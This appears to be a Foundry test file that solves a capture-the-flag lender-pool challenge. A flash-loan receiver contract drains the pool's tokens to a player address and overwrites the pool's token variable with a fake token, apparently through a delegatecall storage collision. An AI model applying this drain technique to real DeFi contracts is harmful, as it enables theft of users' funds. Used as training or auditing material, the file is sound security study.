// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

contract Challenge1Test is Test {
    InSecureumLenderPool private target;
    IERC20 private token;

    address private player = makeAddr("player");

    function setUp() public {
        token = IERC20(address(new InSecureumToken(10 ether)));

        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);

        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {
        vm.startPrank(player);

        //=== this is a sample of flash loan usage
        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();

        target.flashLoan(
            address(_flashLoanReceiver),
            abi.encodeWithSignature("receiveFlashLoan(address)", player)
        );

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}

// @dev this is a demo contract that is used to receive the flash loan
contract FlashLoandReceiverSample {
    IERC20 public token;

    function receiveFlashLoan(
        address _user /* other variables */
    ) public {
        // check tokens before doing arbitrage or liquidation or whatever
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(_user, balanceBefore);

        token = new FakeInSecureumToken(balanceBefore);
    }
}

contract FakeInSecureumToken is ERC20 {
    constructor(uint256 _supply) ERC20("FakeInSecureumToken", "FISEC") {
        _mint(msg.sender, _supply);
    }
}
